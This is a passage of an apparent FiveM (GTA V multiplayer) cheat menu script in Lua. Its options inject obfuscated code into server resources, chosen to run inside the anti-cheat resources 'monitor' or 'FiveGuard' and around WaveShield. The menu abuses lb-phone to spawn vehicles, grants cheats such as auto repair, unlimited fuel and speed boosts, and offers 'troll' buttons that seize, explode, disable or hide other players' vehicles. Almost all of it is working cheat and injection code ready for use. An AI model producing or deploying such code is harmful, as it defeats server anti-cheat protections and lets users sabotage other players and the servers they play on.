                local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                local En_g_Health_Get    = _G.GetVehicleEngineHealth
                local En_g_Health_Set    = _G.SetVehicleEngineHealth
                local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                local function _tick(vh)
                    if vh and vh ~= 0 then
                        No_Hotwire_Set(vh, false)
                        En_g_Degrade_Set(vh, false)
                        ErTyUiOpAsDfGh(vh, false)
                        KeEpOnAb(vh, true)

                        local eh = En_g_Health_Get(vh)
                        if (not eh) or eh < 300.0 then
                            En_g_Health_Set(vh, 900.0)
                        end

                        ZxCvBnMqWeRtYu(vh, true, true, true)
                    end
                end

                while GhYtReFdCxWaQzLp and not Unloaded do
                    local p  = QwErTyUiOp()

                    _tick(AsDfGhJkLz(p, false))
                    _tick(TyUiOpAsDfGh(p))
                    _tick(AsDfGhJkLz(p, true))

                    Wait(0)
                end
            end)
        end

        OpAsDfGhJkLzXcVb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        GhYtReFdCxWaQzLp = false
        local v = GetVehiclePedIsIn(PlayerPedId(), false)
        if v and v ~= 0 then
            SetVehicleKeepEngineOnWhenAbandoned(v, false)
            SetVehicleEngineCanDegrade(v, true)
            SetVehicleUndriveable(v, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Auto Repair", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
        PlAsQwErTyUiOp = true

        local function uPkqLXTm98()
            local QwErTyUiOpAsDf = CreateThread
            QwErTyUiOpAsDf(function()
                while PlAsQwErTyUiOp and not Unloaded do
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local LzXcVbNmQwErTy = GetVehiclePedIsIn
                    local VbNmLkJhGfDsAz = SetVehicleFixed
                    local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                    local ped = AsDfGhJkLzXcVb()
                    local vehicle = LzXcVbNmQwErTy(ped, false)
                    if vehicle and vehicle ~= 0 then
                        VbNmLkJhGfDsAz(vehicle)
                        MnBvCxZaSdFgHj(vehicle, 0.0)
                    end

                    Wait(0)
                end
            end)
        end

        uPkqLXTm98()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        PlAsQwErTyUiOp = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Freeze Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
        LzKxWcVbNmQwErTy = true

        local function WkQ79ZyLpT()
            local tYhGtFrDeSwQaZx = CreateThread
            local xCvBnMqWeRtYuIo = PlayerPedId
            local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
            local gKdNqLpYxMiV = FreezeEntityPosition
            local jBtWxFhPoZuR = Wait

            tYhGtFrDeSwQaZx(function()
                while LzKxWcVbNmQwErTy and not Unloaded do
                    local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                    local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                    if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                        gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                    end
                    jBtWxFhPoZuR(0)
                end
            end)
        end

        WkQ79ZyLpT()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        LzKxWcVbNmQwErTy = false

        local function i7qWlBXtPo()
            local yUiOpAsDfGhJkLz = PlayerPedId
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local FdSaPlMnBvCxZlK = FreezeEntityPosition

            local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
            local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
            if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
            end
        end

        i7qWlBXtPo()
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Vehicle Hop", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
        NuRqVxEyKiOlZm = true

        local function qPTnXLZKyb()
            local ZlXoKmVcJdBeTr = CreateThread
            ZlXoKmVcJdBeTr(function()
                while NuRqVxEyKiOlZm and not Unloaded do
                    local GvHnMzLoPqAxEs = PlayerPedId
                    local DwZaQsXcErDfGt = GetVehiclePedIsIn
                    local BtNhUrLsEkJmWq = IsDisabledControlPressed
                    local PlZoXvNyMcKwQi = ApplyForceToEntity

                    local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                    local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                    if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                        PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                    end

                    Wait(0)
                end
            end)
        end

        qPTnXLZKyb()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        NuRqVxEyKiOlZm = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Rainbow Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
        GxRpVuNzYiTq = true

        local function jqX7TvYzWq()
            local WvBnMpLsQzTx = GetGameTimer
            local VcZoPwLsEkRn = math.floor
            local DfHkLtQwAzCx = math.sin
            local PlJoQwErTgYs = CreateThread
            local MzLxVoKsUyNz = GetVehiclePedIsIn
            local EyUiNkOpLtRg = PlayerPedId
            local KxFwEmTrZpYq = DoesEntityExist
            local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
            local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

            local yGfTzLkRn = 1.0

            local function HrCvWbXuNz(freq)
                local color = {}
                local t = WvBnMpLsQzTx() / 1000
                color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                return color
            end

            PlJoQwErTgYs(function()
                while GxRpVuNzYiTq and not Unloaded do
                    local ped = EyUiNkOpLtRg()
                    local veh = MzLxVoKsUyNz(ped, false)
                    if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                        local rgb = HrCvWbXuNz(yGfTzLkRn)
                        UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                        BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                    end
                    Wait(0)
                end
            end)
        end

        jqX7TvYzWq()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        GxRpVuNzYiTq = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Rainbow Underglow",
    function()
        rainbowUnderglowActive = true
        local selectedVeh = MachoMenuGetSelectedVehicle() or 0

        MachoInjectResource2(3, "any", string.format([[
            local function HSVToRGB(h, s, v)
                local r, g, b
                local i = math.floor(h * 6)
                local f = h * 6 - i
                local p = v * (1 - s)
                local q = v * (1 - f * s)
                local t = v * (1 - (1 - f) * s)
                i = i %% 6 
                if i == 0 then r, g, b = v, t, p
                elseif i == 1 then r, g, b = q, v, p
                elseif i == 2 then r, g, b = p, v, t
                elseif i == 3 then r, g, b = p, q, v
                elseif i == 4 then r, g, b = t, p, v
                elseif i == 5 then r, g, b = v, p, q
                end
                return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
            end

            _G.MachoUnderglowLoop = true
            local selVeh = %d

            Citizen.CreateThread(function()
                local hue = 0
                while _G.MachoUnderglowLoop do
                    Citizen.Wait(10)
                    local vehicle = 0
                    local ped = PlayerPedId()

                    if selVeh ~= 0 and DoesEntityExist(selVeh) then
                        vehicle = selVeh
                    elseif IsPedInAnyVehicle(ped, false) then
                        vehicle = GetVehiclePedIsIn(ped, false)
                    end

                    if vehicle ~= 0 and DoesEntityExist(vehicle) then
                        hue = (hue + 1) %% 360 
                        local r, g, b = HSVToRGB(hue / 360, 1.0, 1.0)
                        
                        for i = 0, 3 do
                            if not IsVehicleNeonLightEnabled(vehicle, i) then
                                SetVehicleNeonLightEnabled(vehicle, i, true)
                            end
                        end
                        SetVehicleNeonLightsColour(vehicle, r, g, b)
                    else
                        Citizen.Wait(500)
                    end
                end
            end)
        ]], selectedVeh))
    end,
    function()
        rainbowUnderglowActive = false
        MachoInjectResource2(3, "any", [[ _G.MachoUnderglowLoop = false ]])
    end
)


local rainbowPaintActive = false

MachoMenuCheckbox(VehicleTabSections[1], "Drift Mode (Hold Shift)", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
        MqTwErYuIoLp = true

        local function PlRtXqJm92()
            local XtFgDsQwAzLp = CreateThread
            local UiOpAsDfGhKl = PlayerPedId
            local JkHgFdSaPlMn = GetVehiclePedIsIn
            local WqErTyUiOpAs = IsControlPressed
            local AsZxCvBnMaSd = DoesEntityExist
            local KdJfGvBhNtMq = SetVehicleReduceGrip

            XtFgDsQwAzLp(function()
                while MqTwErYuIoLp and not Unloaded do
                    Wait(0)
                    local ped = UiOpAsDfGhKl()
                    local veh = JkHgFdSaPlMn(ped, false)
                    if veh ~= 0 and AsZxCvBnMaSd(veh) then
                        if WqErTyUiOpAs(0, 21) then
                            KdJfGvBhNtMq(veh, true)
                        else
                            KdJfGvBhNtMq(veh, false)
                        end
                    end
                end
            end)
        end

        PlRtXqJm92()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        MqTwErYuIoLp = false
        local ZtQwErTyUiOp = PlayerPedId
        local DfGhJkLzXcVb = GetVehiclePedIsIn
        local VbNmAsDfGhJk = DoesEntityExist
        local NlJkHgFdSaPl = SetVehicleReduceGrip

        local ped = ZtQwErTyUiOp()
        local veh = DfGhJkLzXcVb(ped, false)
        if veh ~= 0 and VbNmAsDfGhJk(veh) then
            NlJkHgFdSaPl(veh, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Easy Handling", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
        NvGhJkLpOiUy = true

        local function KbZwVoYtLx()
            local BtGhYtUlOpLk = CreateThread
            local WeRtYuIoPlMn = PlayerPedId
            local TyUiOpAsDfGh = GetVehiclePedIsIn
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong

            BtGhYtUlOpLk(function()
                while NvGhJkLpOiUy and not Unloaded do
                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 73.0)
                        PlMnBvCxZaSd(veh, true)
                    end
                    Wait(0)
                end

                local ped = WeRtYuIoPlMn()
                local veh = TyUiOpAsDfGh(ped, false)
                if veh and veh ~= 0 then
                    UyTrBnMvCxZl(veh, 9.8)
                    PlMnBvCxZaSd(veh, false)
                end
            end)
        end

        KbZwVoYtLx()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        NvGhJkLpOiUy = false
        local UyTrBnMvCxZl = SetVehicleGravityAmount
        local PlMnBvCxZaSd = SetVehicleStrong
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            UyTrBnMvCxZl(veh, 9.8)
            PlMnBvCxZaSd(veh, false)
        end
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Shift Boost", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
        QwErTyUiOpSh = true

        local function ZxCvBnMmLl()
            local aAaBbCcDdEe = CreateThread
            local fFfGgGgHhIi = Wait
            local jJkKlLmMnNo = PlayerPedId
            local pPqQrRsStTu = IsPedInAnyVehicle
            local vVwWxXyYzZa = GetVehiclePedIsIn
            local bBcCdDeEfFg = IsDisabledControlJustPressed
            local sSeEtTvVbBn = SetVehicleForwardSpeed

            aAaBbCcDdEe(function()
                while QwErTyUiOpSh and not Unloaded do
                    local _ped = jJkKlLmMnNo()
                    if pPqQrRsStTu(_ped, false) then
                        local _veh = vVwWxXyYzZa(_ped, false)
                        if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                            sSeEtTvVbBn(_veh, 150.0)
                        end
                    end
                    fFfGgGgHhIi(0)
                end
            end)
        end

        ZxCvBnMmLl()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        QwErTyUiOpSh = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Instant Breaks", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
        VkLpOiUyTrEq = true

        local function YgT7FrqXcN()
            local ZxSeRtYhUiOp = CreateThread
            local LkJhGfDsAzXv = PlayerPedId
            local PoLkJhBgVfCd = GetVehiclePedIsIn
            local ErTyUiOpAsDf = IsDisabledControlPressed
            local GtHyJuKoLpMi = IsPedInAnyVehicle
            local VbNmQwErTyUi = SetVehicleForwardSpeed

            ZxSeRtYhUiOp(function()
                while VkLpOiUyTrEq and not Unloaded do
                    local ped = LkJhGfDsAzXv()
                    local veh = PoLkJhBgVfCd(ped, false)
                    if veh and veh ~= 0 then
                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                            VbNmQwErTyUi(veh, 0.0)
                        end
                    end
                    Wait(0)
                end
            end)
        end

        YgT7FrqXcN()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        VkLpOiUyTrEq = false
    ]])
end)

MachoMenuCheckbox(VehicleTabSections[1], "Unlimited Fuel", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
        BlNkJmLzXcVb = true

        local function LqWyXpR3tV()
            local TmPlKoMiJnBg = CreateThread
            local ZxCvBnMaSdFg = PlayerPedId
            local YhUjIkOlPlMn = IsPedInAnyVehicle
            local VcXzQwErTyUi = GetVehiclePedIsIn
            local KpLoMkNjBhGt = DoesEntityExist
            local JkLzXcVbNmAs = SetVehicleFuelLevel

            TmPlKoMiJnBg(function()
                while BlNkJmLzXcVb and not Unloaded do
                    local ped = ZxCvBnMaSdFg()
                    if YhUjIkOlPlMn(ped, false) then
                        local veh = VcXzQwErTyUi(ped, false)
                        if KpLoMkNjBhGt(veh) then
                            JkLzXcVbNmAs(veh, 100.0)
                        end
                    end
                    Wait(100)
                end
            end)
        end

        LqWyXpR3tV()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        BlNkJmLzXcVb = false
    ]])
end)

MachoMenuText(VehicleTabSections[1], "Vehicle Spawn & Plate ")

local LicensePlateHandle = MachoMenuInputbox(VehicleTabSections[1], "License Plate:", "...")
MachoMenuButton(VehicleTabSections[1], "Set License Plate", function()
    local LicensePlate = MachoMenuGetInputbox(LicensePlateHandle)

    if type(LicensePlate) == "string" and LicensePlate ~= "" then
        local injectedCode = string.format([[
            local function xKqLZVwPt9()
                local XcVbNmAsDfGhJkL = PlayerPedId
                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                local pEd = XcVbNmAsDfGhJkL()
                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                if vEh and vEh ~= 0 then
                    PoIuYtReWqAzXsDc(vEh, "%s")
                end

            end

            xKqLZVwPt9()
        ]], LicensePlate)

        MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
    end
end)

local VehicleSpawnerBox = MachoMenuInputbox(VehicleTabSections[1], "Vehicle Model:", "...")
MachoMenuButton(VehicleTabSections[1], "Spawn Car", function()
    local VehicleModel = MachoMenuGetInputbox(VehicleSpawnerBox)

    local waveShieldRunning = GetResourceState("WaveShield") == "started"
    local lbPhoneRunning = GetResourceState("lb-phone") == "started"

    local injectedCode

    if not waveShieldRunning and lbPhoneRunning then
        injectedCode = ([[ 
            if type(CreateFrameworkVehicle) == "function" then
                local model = "%s"
                local hash = GetHashKey(model)
                local ped = PlayerPedId()
                if DoesEntityExist(ped) then
                    local coords = GetEntityCoords(ped)
                    if coords then
                        local vehicleData = {
                            vehicle = json.encode({ model = model })
                        }
                        CreateFrameworkVehicle(vehicleData, coords)
                    end
                end
            end
        ]]):format(VehicleModel)

        MachoInjectResource("lb-phone", injectedCode)

    else
        injectedCode = ([[ 
            local function XzRtVbNmQwEr()
                local tYaPlXcUvBn = PlayerPedId
                local iKoMzNbHgTr = GetEntityCoords
                local wErTyUiOpAs = GetEntityHeading
                local hGtRfEdCvBg = RequestModel
                local bNjMkLoIpUh = HasModelLoaded
                local pLkJhGfDsAq = Wait
                local sXcVbNmZlQw = GetVehiclePedIsIn
                local yUiOpAsDfGh = DeleteVehicle
                local aSxDcFgHvBn = _G.CreateVehicle
                local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                local zMxNaLoKvRe = SetEntityAsMissionEntity
                local mVbGtRfEdCv = SetVehicleOutOfControl
                local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                local vBtNrEuPwOa = SetNetworkIdCanMigrate
                local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                local bPeDrTfGyHu = tYaPlXcUvBn()
                local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                local nMiLoPzXwEq = "%s"

                hGtRfEdCvBg(nMiLoPzXwEq)
                while not bNjMkLoIpUh(nMiLoPzXwEq) do
                    pLkJhGfDsAq(100)
                end

                local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                    yUiOpAsDfGh(fVbGtFrEdSw)
                end

                local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                eDsFgHjKlQw(xFrEdCvBgTn, false)
                lAzSdXfCvBg(sMnLoKiJpUb, true)
                nMqWlAzXcVb(xFrEdCvBgTn, false)
                vBtNrEuPwOa(sMnLoKiJpUb, true)
                gHrTyUjLoPk(nMiLoPzXwEq)

                kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
            end

            XzRtVbNmQwEr()
        ]]):format(VehicleModel)

        MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
    end
end)

MachoMenuText(VehicleTabSections[1], "Trolls")

MachoMenuButton(VehicleTabSections[1], "Bug Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineOn(vehicle, false, true, true)
            SetVehicleEngineHealth(vehicle, -100.0)
            
            local upwardForce = 400.0
            SetEntityVelocity(vehicle, 0.0, 0.0, upwardForce)
            SetEntityRotation(vehicle, 180.0, 0.0, 0.0, 1, true)
        end
    ]], selectedVeh))
end)


MachoMenuButton(VehicleTabSections[1], "Kill Engine", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineOn(vehicle, false, true, true)
            SetVehicleEngineHealth(vehicle, -4000.0)
            SetVehicleFuelLevel(vehicle, 0.0)
            SetVehicleUndriveable(vehicle, true)

            Citizen.CreateThread(function()
                local count = 0
                while count < 100 do
                    local offX = (math.random(-50, 50) / 100)
                    local offY = (math.random(-50, 50) / 100)
                    local offZ = (math.random(-50, 50) / 100)
                    
                    ApplyForceToEntity(vehicle, 1, offX, offY, offZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                    SetEntityRotation(vehicle, math.random(0, 360)+0.0, 0.0, math.random(0, 360)+0.0, 1, true)
                    
                    Wait(10)
                    count = count + 1
                end
            end)
        end
    ]], selectedVeh))
end)



MachoMenuButton(VehicleTabSections[1], "Glitch Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local targetVeh = %d
        local modelHash = GetHashKey("sultan")

        if targetVeh ~= 0 and DoesEntityExist(targetVeh) then
            RequestModel(modelHash)
            local t = 0
            while not HasModelLoaded(modelHash) and t < 50 do Wait(1) t = t + 1 end

            if HasModelLoaded(modelHash) then
                local coords = GetEntityCoords(targetVeh)
                local forward = GetEntityForwardVector(targetVeh)
                local spawnPos = coords + (forward * 5.0)

                local ghostVeh = CreateVehicle(modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, false)
                
                if DoesEntityExist(ghostVeh) then
                    SetEntityVisible(ghostVeh, false, false)
                    SetEntityAlpha(ghostVeh, 0, false)
                    SetEntityCollision(ghostVeh, true, true)
                    
                    NetworkRequestControlOfEntity(targetVeh)
                    SetVehicleEngineOn(targetVeh, false, true, true)
                    SetVehicleEngineHealth(targetVeh, -4000.0)
                    SetVehicleFuelLevel(targetVeh, 0.0)
                    
                    local ramDirection = coords - spawnPos
                    SetEntityVelocity(ghostVeh, ramDirection.x * 15.0, ramDirection.y * 15.0, ramDirection.z * 15.0)
                    
                    Citizen.CreateThread(function()
                        Wait(1000)
                        if DoesEntityExist(ghostVeh) then 
                            DeleteEntity(ghostVeh) 
                        end
                    end)
                end
                SetModelAsNoLongerNeeded(modelHash)
            end
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Force Invisible Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetEntityVisible(vehicle, false, false)
            SetEntityAlpha(vehicle, 0, false)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Force Visible Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetEntityVisible(vehicle, true, false)
            ResetEntityAlpha(vehicle)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Explode Vehicle", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local vehicle = %d
        
        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            local timeout = 0
            while not NetworkHasControlOfEntity(vehicle) and timeout < 50 do
                Wait(1)
                timeout = timeout + 1
            end

            SetVehicleEngineHealth(vehicle, -1000.0)
            
            if DoesEntityExist(vehicle) then
                NetworkExplodeVehicle(vehicle, true, false, 0)
            end
            
            SetVehicleBodyHealth(vehicle, -1000.0)
            SetVehiclePetrolTankHealth(vehicle, -1000.0)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Make Front Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 6.0, 0.0, 10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Make Back Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 6.0, 0.0, -10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Make Kick Flip", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 5.0, 5.0, 0.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)


MachoMenuButton(VehicleTabSections[1], "Make Vehicle Jump", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            local vel = GetEntityVelocity(vehicle)
            
            SetEntityVelocity(vehicle, vel.x, vel.y, 15.0)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Make Vehicle SuperJump", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            local vel = GetEntityVelocity(vehicle)
            
            SetEntityVelocity(vehicle, vel.x, vel.y, 1000.0)
        end
    ]], selectedVeh))
end)

MachoMenuButton(VehicleTabSections[1], "Make 360 Spin", function()
    local selectedVeh = MachoMenuGetSelectedVehicle() or 0
    
    MachoInjectResource2(3, "any", string.format([[
        local selVeh = %d
        local ped = PlayerPedId()
        local vehicle = (selVeh ~= 0 and DoesEntityExist(selVeh)) and selVeh or GetVehiclePedIsIn(ped, false)

        if vehicle ~= 0 and DoesEntityExist(vehicle) then
            NetworkRequestControlOfEntity(vehicle)
            
            ApplyForceToEntity(vehicle, 1, 50.0, 0.0, 0.0, 0.0, 10.0, 0.0, 0, false, true, true, false, true)
        end
    ]], selectedVeh))
end)

